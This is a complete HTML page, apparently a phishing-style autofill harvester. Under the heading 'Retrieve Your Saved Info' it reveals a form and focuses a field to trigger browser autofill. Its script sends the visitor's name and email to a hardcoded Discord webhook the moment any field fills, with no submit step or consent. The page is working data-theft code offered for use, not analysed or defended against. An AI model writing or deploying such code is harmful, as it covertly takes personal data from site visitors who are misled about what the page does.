<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Quick Autofill and Submit</title>
</head>
<body>
  <h1>Retrieve Your Saved Info</h1>
  <p id="trigger" style="cursor:pointer; color:blue; text-decoration:underline;">
    Click here to autofill your details
  </p>

  <div id="formContainer" style="display:none;">
    <p>Please click in the fields if needed. Once autofill occurs on any field, we'll submit the data immediately.</p>
    <form id="userForm" autocomplete="on">
      <label for="fname">First Name:</label>
      <input type="text" id="fname" name="given-name" autocomplete="given-name" required><br><br>

      <label for="lname">Last Name:</label>
      <input type="text" id="lname" name="family-name" autocomplete="family-name" required><br><br>

      <label for="email">Email:</label>
      <input type="email" id="email" name="email" autocomplete="email" required><br><br>
    </form>
  </div>

  <script>
    // Discord webhook provided by the user
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1316507623830458530/AJs1HDBblw6pbV0MldGNLKA3pusxfwjPjFg1qKZ7qO3UcCLtkbTv5SIHvXTVS1FK9z58';

    const trigger = document.getElementById('trigger');
    const formContainer = document.getElementById('formContainer');
    const fnameField = document.getElementById('fname');
    const lnameField = document.getElementById('lname');
    const emailField = document.getElementById('email');

    // Show the form when the user clicks the trigger text
    trigger.addEventListener('click', () => {
      formContainer.style.display = 'block';
      // Focus the first field to prompt the browser to offer autofill
      fnameField.focus();
    });

    function checkFields() {
      // Submit as soon as any one field has a value
      if (fnameField.value.trim() !== '' || lnameField.value.trim() !== '' || emailField.value.trim() !== '') {
        submitForm(
          fnameField.value.trim() || '[No First Name]',
          lnameField.value.trim() || '[No Last Name]',
          emailField.value.trim() || '[No Email]'
        );
      }
    }

    function submitForm(fname, lname, email) {
      const message = `**Autofilled Submission (at least one field):**\n**First Name:** ${fname}\n**Last Name:** ${lname}\n**Email:** ${email}`;
      fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: message })
      })
      .then(response => {
        if (response.ok) {
          console.log('Message sent to Discord successfully!');
        } else {
          console.error('Failed to send message to Discord:', response.status, response.statusText);
        }
      })
      .catch(err => console.error('Error sending message to Discord:', err));
    }

    // Listen for input and change events on all fields.
    // As soon as one field gets filled (by autofill or user input), we submit.
    fnameField.addEventListener('input', checkFields);
    lnameField.addEventListener('input', checkFields);
    emailField.addEventListener('input', checkFields);

    fnameField.addEventListener('change', checkFields);
    lnameField.addEventListener('change', checkFields);
    emailField.addEventListener('change', checkFields);
  </script>
</body>
</html>
